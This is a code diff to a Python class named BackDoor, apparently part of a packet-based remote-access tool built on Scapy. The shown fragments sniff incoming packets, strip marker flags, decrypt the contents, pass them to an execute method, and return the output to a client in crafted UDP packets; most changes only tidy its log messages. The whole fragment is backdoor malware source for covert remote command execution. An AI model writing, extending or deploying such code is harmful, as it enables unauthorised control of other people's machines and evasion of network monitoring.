@@ -20,25 +20,24 @@ class BackDoor:
         self.client = ""
 
     def start(self):
-        print("Starting")
+        print("Starting.....")
+        print("Listening for packets")
+        print("--------------------------------------------------------------")
         self.sniff_init()
     def craft_packet(self, msg: str):
-        print(f"{self.client} is the clioent")
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.client_port)
         payload = msg
         pkt = ip / udp / payload
         try:
-            print("crafting and sending")
+            print("Sending output back to client")
             send(pkt, verbose=0)
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
     def prepare_msg(self, cmd: str) -> str:
-        print("in prepare")
         cipher = self.generate_cipher()
-        print("ciph")
         encrypted_data = self.encrypt_data(cipher, cmd)
         # Convert the encrypted string to bytes
 
@@ -63,9 +62,9 @@ class BackDoor:
             sys.exit()
 
     def process_packets(self, data: str) -> None:
-        print("Stripping flags to extract data")
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
         decrypted_msg = self.decrypt_data(stripped_msg)
+        print(f"Executing: {decrypted_msg}")
         self.execute(decrypted_msg)
 
 
@@ -87,7 +86,7 @@ class BackDoor:
             return
 
     def set_client(self, ip):
-        print(f"Setting ip as {ip}")
+        print(f"Setting client ip as {ip}")
         self.client = ip
 
     def decrypt_data(self, encrypted_msg: str) -> str:
